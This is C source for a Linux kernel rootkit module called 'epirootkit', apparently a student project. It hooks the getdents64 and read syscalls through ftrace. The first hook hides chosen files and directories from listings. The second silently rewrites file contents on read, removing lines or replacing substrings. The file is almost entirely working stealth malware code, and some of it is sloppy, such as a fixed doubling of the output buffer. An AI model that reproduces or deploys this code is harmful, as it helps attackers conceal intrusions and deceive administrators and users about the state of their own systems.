#include <linux/file.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/file.h>

#include "epirootkit.h"

// C'EST LE BORDEL, A COMMENTER, TRIER ET ORGANISER PROCHAINEMENT
// PTET AMELIORER : 
//  - possibilite d'avoir plusieurs lignes caches
//  - possibilite d'avoir plusieurs rules de replacement
//  - possiblite d'avoir plusieurs rules de keyword a cacher
//  - fuck le qwerty

/*
 * regs->di       <- RDI <- 1st argument (so the file descriptor for read)
 * regs->si       <- RSI <- 2nd argument (user‐buf pointer)
 * regs->dx       <- RDX <- 3rd argument (count)
 */

// Directory entry structure as 'returned' (by pointer) by getdents64 syscall
// Used to read a directory content
// If I do not define it here, I have a compilation error... does not seem to be included in linux headers
// (tried dirent.h, with no success)
// (at least not in the ones I have on my system LOL)
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

struct modified_file {
    char *file_path;
    int hide_line_with_number;
    char *hide_line_with_substring;
    char *replace_src;
    char *replace_dst;
    struct list_head list;
};

// Structure to hold hidden directory names
struct hidden_dir_entry {
    char *dirname;
    struct list_head list;
};

static LIST_HEAD(hidden_dirs_list);
static LIST_HEAD(modified_files_list);
static DEFINE_SPINLOCK(hidden_dirs_lock);
static DEFINE_SPINLOCK(modified_files_lock);

// Function prototypes
int add_hidden_dir(const char *dirname);
int remove_hidden_dir(const char *dirname);
int is_hidden(const char *name);

// Hooks declaration
asmlinkage int getdents64_hook(const struct pt_regs *regs);
asmlinkage long openat_hook(const struct pt_regs *regs);

/**
 * @brief Adds a directory name to the dynamic hidden directories list.
 *
 * @dirname: The directory name to remove.
 * @return 0 on success or a negative error code on failure.
 */
int add_hidden_dir(const char *dirname) {
    struct hidden_dir_entry *entry;

    if (is_hidden(dirname))
        return 0;

    // Maybe need to improve this part...
    bool is_path = dirname[0] == '/';
    if (!is_path) {
        ERR_MSG("hooks: please provide a valid full‑path entry.\n");
        return -EINVAL;
    }

    // Allocate memory for the new hidden directory entry.
    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry)
        return -ENOMEM;

    // Duplicate the directory name to store it safely.
    entry->dirname = kstrdup(dirname, GFP_KERNEL);
    if (!entry->dirname) {
        kfree(entry);
        return -ENOMEM;
    }

    // Acquire the spinlock to modify the list.
    spin_lock(&hidden_dirs_lock);
    list_add_tail(&entry->list, &hidden_dirs_list);
    spin_unlock(&hidden_dirs_lock);

    DBG_MSG("hooks: added %s file or directory\n", entry->dirname);

    return 0;
}

/**
 * @brief Removes a directory name from the dynamic hidden directories list.
 *
 * @dirname: The directory name to remove.
 * @return 0 on success or -ENOENT if the directory name is not found.
 */
int remove_hidden_dir(const char *dirname) {
    struct hidden_dir_entry *entry;
    int found = 0;

    // Acquire the spinlock for safe list traversal and modification.
    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        if (strcmp(entry->dirname, dirname) == 0) {
            list_del(&entry->list);
            kfree(entry->dirname);
            kfree(entry);
            found = 1;
            break;
        }
    }
    spin_unlock(&hidden_dirs_lock);

    return found ? 0 : -ENOENT;
}

/**
 * @brief Checks if a given directory name is in the hidden list.
 *
 * @name: The directory name to check.
 * @return 1 if the directory is to be hidden, 0 otherwise.
 */
int is_hidden(const char *name) {
    struct hidden_dir_entry *entry;
    int hidden = 0;

    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        if (strcmp(entry->dirname, name) == 0) {
            hidden = 1;
            break;
        }
    }
    spin_unlock(&hidden_dirs_lock);
    return hidden;
}

int list_hidden_dirs(char *buf, size_t buf_size) {
    struct hidden_dir_entry *entry;
    size_t len = 0;

    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        len += scnprintf(buf + len, buf_size - len, "%s\n", entry->dirname);
        if (len >= buf_size - 1)
            break;
    }
    spin_unlock(&hidden_dirs_lock);

    return len;
}

// Original syscall pointers
asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);

// Function to hook the getdents64 syscall
asmlinkage int getdents64_hook(const struct pt_regs *regs) {
    int ret;
    int fd = (int)regs->di;
    struct file *dir_f;
    struct path parent_path;
    char dirbuf[512];
    char *dirstr = NULL;

    dir_f = fget(fd);
    if (dir_f) {
        parent_path = dir_f->f_path;
        path_get(&parent_path);
        dirstr = d_path(&parent_path, dirbuf, sizeof(dirbuf));
        path_put(&parent_path);
        fput(dir_f);
    }

    // Get the pointer to the directory entrues buffer
    struct linux_dirent64 __user *user_dir =
        (struct linux_dirent64 __user *)regs->si;

    // Get the size of the buffer
    // unsigned int count = (unsigned int)regs->dx;

    // Call the original getdents64 syscall, to have the buffer updated
    // Next, we just need to check directories in the buffer,
    // remove the ones we don't want, and copy the buffer to user space
    ret = __orig_getdents64(regs);
    if (ret < 0)
        return ret;

    // Allocate a temporary buffer in kernel space for copying and processing
    // the entries. Next copy the buffer from user space to kernel space.
    char *kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }

    // Current position in the kbuf buffer for processing entries
    unsigned int offset = 0;

    // Allocate a second temporary buffer to store the non-hidden directory
    // entries
    char *newbuf = kmalloc(ret, GFP_KERNEL);
    if (!newbuf) {
        kfree(kbuf);
        return ret;
    }

    unsigned int new_size = ret;
    unsigned int new_off = 0;

    // Loop through the entries in the buffer
    // Check if the entry is hidden or not
    while (offset < ret) {
        struct linux_dirent64 *d = (void *)(kbuf + offset);
        int reclen = d->d_reclen;

        // Build full path to be more precise than before
        bool hide = false;
        if (dirstr) {
            char fullpath[512];
            int len;

            if (strcmp(dirstr, "/") == 0) {
                len = snprintf(fullpath, sizeof(fullpath), "/%s", d->d_name);
            }
            else {
                len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirstr, d->d_name);
            }

            if (len > 0 && len < sizeof(fullpath) && is_hidden(fullpath))
                hide = true;
        }

        if (hide)
            new_size -= reclen;
        else {
            memcpy(newbuf + new_off, d, reclen);
            new_off += reclen;
        }
        offset += reclen;
    }

    // Copy the modified new buffer back to the user-space buffer to replace the original buf
    if (copy_to_user(user_dir, newbuf, new_size)) {
        kfree(kbuf);
        kfree(newbuf);
        return ret;
    }

    kfree(kbuf);
    kfree(newbuf);

    // New size without directories we do not want...
    return new_size;
}

static asmlinkage long (*__orig_read)(const struct pt_regs *regs);
static asmlinkage long read_hook(const struct pt_regs *regs);

asmlinkage long read_hook(const struct pt_regs *regs) {
    long ret = __orig_read(regs);
    if (ret <= 0)
        return ret;

    // Resolve fd absolute path
    int fd = regs->di;
    struct file *f = fget(fd);
    if (!f)
        return ret;
    struct path p = f->f_path;
    path_get(&p);
    char buf[PATH_MAX];
    char *fullpath = d_path(&p, buf, sizeof(buf));
    path_put(&p);
    fput(f);
    if (IS_ERR(fullpath))
        return ret;

    // Look up rule for this path
    struct modified_file *rule = NULL, *m;
    spin_lock(&modified_files_lock);
    list_for_each_entry(m, &modified_files_list, list) if (strcmp(fullpath, m->file_path) == 0) {
        rule = m;
        break;
    }
    spin_unlock(&modified_files_lock);
    if (!rule)
        return ret;

    // Copy user buffer to kernel space
    char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, (char __user *)regs->si, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    // Allocate a new buffer for the modified content, times 2, no other idea for the moment
    char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
    if (!out) {
        kfree(kbuf);
        return ret;
    }

    int line_no = 0;
    size_t out_len = 0;
    char *line;
    while ((line = strsep(&kbuf, "\n"))) {
        bool skip = false;
        line_no++;

        // HIde line by number
        if (rule->hide_line_with_number && line_no == rule->hide_line_with_number)
            skip = true;

        // Hide line by substring
        if (!skip && rule->hide_line_with_substring && strstr(line, rule->hide_line_with_substring))
            skip = true;

        // Replace substring
        if (!skip && rule->replace_src) {
            char *seg = line, *p2;
            while ((p2 = strstr(seg, rule->replace_src))) {
                // First part of the line
                size_t before = p2 - seg;
                memcpy(out + out_len, seg, before);
                out_len += before;

                // Replace substring
                memcpy(out + out_len, rule->replace_dst, strlen(rule->replace_dst));
                out_len += strlen(rule->replace_dst);
                seg = p2 + strlen(rule->replace_src);
            }

            // Copy the rest of the line
            strcpy(out + out_len, seg);
            out_len += strlen(seg);
            out[out_len++] = '\n';
            continue;
        }

        // Copy original line if not skipped
        if (!skip) {
            memcpy(out + out_len, line, strlen(line));
            out_len += strlen(line);
            out[out_len++] = '\n';
        }
    }
    out[out_len] = '\0';

    // Write back to user space
    if (!copy_to_user((char __user *)regs->si, out, out_len))
        ret = out_len;

    kfree(out);
    kfree(kbuf);
    return ret;
}

int add_modified_file(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst) {
    struct modified_file *m;
    m = kmalloc(sizeof(*m), GFP_KERNEL);
    if (!m)
        return -ENOMEM;

    m->file_path = kstrdup(path, GFP_KERNEL);
    m->hide_line_with_number = hide_line;
    m->hide_line_with_substring = hide_substr ? kstrdup(hide_substr, GFP_KERNEL) : NULL;
    m->replace_src = src ? kstrdup(src, GFP_KERNEL) : NULL;
    m->replace_dst = dst ? kstrdup(dst, GFP_KERNEL) : NULL;

    spin_lock(&modified_files_lock);
    list_add_tail(&m->list, &modified_files_list);
    spin_unlock(&modified_files_lock);

    DBG_MSG("hooks: added modified_file rule for %s\n", path);
    return 0;
}

int remove_modified_file(const char *path) {
    struct modified_file *m, *tmp;
    int found = 0;
    spin_lock(&modified_files_lock);
    list_for_each_entry_safe(m, tmp, &modified_files_list, list) {
        if (strcmp(m->file_path, path) == 0) {
            list_del(&m->list);
            kfree(m->file_path);
            kfree(m->hide_line_with_substring);
            kfree(m->replace_src);
            kfree(m->replace_dst);
            kfree(m);
            found = 1;
            break;
        }
    }
    spin_unlock(&modified_files_lock);
    return found ? 0 : -ENOENT;
}

int list_modified_files(char *buf, size_t size) {
    struct modified_file *m;
    size_t len = 0;
    spin_lock(&modified_files_lock);
    list_for_each_entry(m, &modified_files_list, list) {
        len += scnprintf(buf + len, size - len, "%s hide_line=%d hide_substr=%s replace=%s->%s\n",
                         m->file_path,
                         m->hide_line_with_number,
                         m->hide_line_with_substring ?: "none",
                         m->replace_src ?: "none",
                         m->replace_dst ?: "none");
        if (len >= size - 1)
            break;
    }
    spin_unlock(&modified_files_lock);
    return len;
}

// Array of hooks to install.
size_t hook_array_size = 2;
struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64),
    HOOK("sys_read", read_hook, &__orig_read)
};